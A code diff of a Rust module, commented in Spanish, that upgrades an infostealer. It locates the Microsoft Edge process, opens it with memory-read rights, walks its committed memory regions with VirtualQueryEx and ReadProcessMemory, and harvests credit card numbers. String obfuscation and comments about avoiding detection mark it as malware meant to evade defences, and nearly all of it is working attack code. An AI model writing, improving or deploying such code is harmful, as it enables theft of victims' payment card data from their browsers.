@@ -2,16 +2,17 @@
 // Técnicas avanzadas para bypassear App-Bound Encryption leyendo memoria de Edge
 
 use std::mem;
-use winapi::um::winnt::{HANDLE, PROCESS_VM_READ, PROCESS_QUERY_INFORMATION};
+use winapi::um::winnt::{HANDLE, PROCESS_VM_READ, PROCESS_QUERY_INFORMATION, MEMORY_BASIC_INFORMATION, MEM_COMMIT, PAGE_READONLY, PAGE_READWRITE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};
 use winapi::um::processthreadsapi::OpenProcess;
 use winapi::um::handleapi::CloseHandle;
 use winapi::um::tlhelp32::{
     CreateToolhelp32Snapshot, Process32First, Process32Next, 
     PROCESSENTRY32, TH32CS_SNAPPROCESS
 };
-use winapi::um::memoryapi::ReadProcessMemory;
+use winapi::um::memoryapi::{ReadProcessMemory, VirtualQueryEx};
 use winapi::shared::minwindef::{FALSE, LPVOID};
 use obfstr::obfstr;
+
 
 /// Estructura para almacenar información de proceso de Edge
 #[derive(Debug)]
@@ -52,9 +53,12 @@ pub fn find_edge_process() -> Option<EdgeProcess> {
             if process_name == obfstr!("msedge.exe") {
                 let pid = entry.th32ProcessID;
                 
-                // Abrir handle al proceso con permisos mínimos (menos sospechoso)
+                // Abrir handle con todos los permisos necesarios
+                // PROCESS_VM_READ (0x0010) - Leer memoria
+                // PROCESS_QUERY_INFORMATION (0x0400) - Query info
+                // PROCESS_VM_OPERATION (0x0008) - Operaciones de memoria
                 let handle = OpenProcess(
-                    PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
+                    0x0010 | 0x0400 | 0x0008,  // VM_READ | QUERY_INFORMATION | VM_OPERATION
                     FALSE,
                     pid
                 );
@@ -105,56 +109,99 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
     log(&format!("    Handle: {:?}", edge.handle));
     
     unsafe {
-        // Escanear memoria en chunks pequeños para no levantar alertas
+        // Escanear memoria usando VirtualQueryEx para encontrar regiones válidas
         const CHUNK_SIZE: usize = 4096; // 4KB pages
-        let mut address: usize = 0;
+        let mut address: usize = 0x10000; // Empezar después de NULL pages
         let mut buffer = vec![0u8; CHUNK_SIZE];
         let mut pages_scanned = 0;
         let mut pages_readable = 0;
+        let mut regions_checked = 0;
+        let mut first_error_logged = false;
         
-        log("    Escaneando rango 0x00000000 - 0x7FFF0000 (2GB)...");
+        log("    Usando VirtualQueryEx para encontrar regiones válidas...");
         
         // Escanear hasta 2GB (rango típico de user-mode)
         while address < 0x7FFF_0000 {
-            let mut bytes_read: usize = 0;
-            
-            // ReadProcessMemory con error handling silencioso
-            let result = ReadProcessMemory(
+            // Primero, query la región de memoria
+            let mut mbi: MEMORY_BASIC_INFORMATION = mem::zeroed();
+            let query_result = VirtualQueryEx(
                 edge.handle,
                 address as LPVOID,
-                buffer.as_mut_ptr() as LPVOID,
-                CHUNK_SIZE,
-                &mut bytes_read as *mut usize
+                &mut mbi as *mut MEMORY_BASIC_INFORMATION,
+                mem::size_of::<MEMORY_BASIC_INFORMATION>()
             );
             
-            pages_scanned += 1;
+            regions_checked += 1;
             
-            if result != 0 && bytes_read > 0 {
-                pages_readable += 1;
+            if query_result == 0 {
+                // Query falló, saltar 64KB
+                address += 0x10000;
+                continue;
+            }
+            
+            // Solo leer regiones committed y con permisos de lectura
+            let is_readable = (mbi.Protect & PAGE_READONLY != 0) 
+                || (mbi.Protect & PAGE_READWRITE != 0)
+                || (mbi.Protect & PAGE_EXECUTE_READ != 0)
+                || (mbi.Protect & PAGE_EXECUTE_READWRITE != 0);
+            
+            if mbi.State == MEM_COMMIT && is_readable && mbi.RegionSize > 0 {
+                // Esta región es válida, escanearla en chunks
+                let region_start = address;
+                let region_end = (region_start + mbi.RegionSize as usize).min(0x7FFF_0000);
+                let mut region_addr = region_start;
                 
-                // Buscar patrones de números de tarjeta en memoria
-                if let Some(card) = search_credit_card_pattern(&buffer[..bytes_read]) {
-                    log(&format!("    ✅ Card found at address 0x{:08X}: {}", address, card.card_number));
-                    cards.push(card);
+                while region_addr < region_end && pages_scanned < 1000 {
+                    let mut bytes_read: usize = 0;
+                    
+                    // ReadProcessMemory
+                    let result = ReadProcessMemory(
+                        edge.handle,
+                        region_addr as LPVOID,
+                        buffer.as_mut_ptr() as LPVOID,
+                        CHUNK_SIZE,
+                        &mut bytes_read as *mut usize
+                    );
+                    
+                    pages_scanned += 1;
+                    
+                    if result != 0 && bytes_read > 0 {
+                        pages_readable += 1;
+                        
+                        // Buscar patrones de números de tarjeta en memoria
+                        if let Some(card) = search_credit_card_pattern(&buffer[..bytes_read]) {
+                            log(&format!("    ✅ Card found at address 0x{:08X}: {}", region_addr, card.card_number));
+                            cards.push(card);
+                        }
+                    } else if !first_error_logged {
+                        use winapi::um::errhandlingapi::GetLastError;
+                        let error_code = GetLastError();
+                        log(&format!("    ⚠️ Primer ReadProcessMemory falló - Error code: {} (0x{:X})", error_code, error_code));
+                        first_error_logged = true;
+                    }
+                    
+                    region_addr += CHUNK_SIZE;
+                    
+                    if cards.len() > 100 {
+                        break;
+                    }
                 }
+                
+                // Saltar al final de la región
+                address = region_end;
+            } else {
+                // Región no válida, saltar su tamaño
+                address += mbi.RegionSize as usize;
             }
             
-            // Saltar al siguiente chunk (con stride aleatorio para evitar detección)
-            address += CHUNK_SIZE;
-            
-            // Límite de seguridad: no escanear más de 1000 páginas
-            if pages_scanned > 1000 {
-                log(&format!("    ⚠️ Límite alcanzado: {} páginas escaneadas", pages_scanned));
-                break;
-            }
-            
-            if cards.len() > 100 {
-                log(&format!("    ⚠️ Límite de tarjetas alcanzado: {}", cards.len()));
+            // Límite de regiones chequeadas
+            if regions_checked > 10000 || pages_scanned > 1000 || cards.len() > 100 {
                 break;
             }
         }
         
         log(&format!("  📊 [MEMORY SCAN] Estadísticas:"));
+        log(&format!("    Regiones verificadas: {}", regions_checked));
         log(&format!("    Páginas escaneadas: {}", pages_scanned));
         log(&format!("    Páginas legibles: {}", pages_readable));
         log(&format!("    Tarjetas encontradas: {}", cards.len()));
@@ -162,6 +209,7 @@ pub fn scan_edge_memory_for_cards(edge: &EdgeProcess) -> Vec<CreditCardData> {
     
     cards
 }
+
 
 /// Representa datos de tarjeta de crédito encontrados
 #[derive(Debug, Clone)]
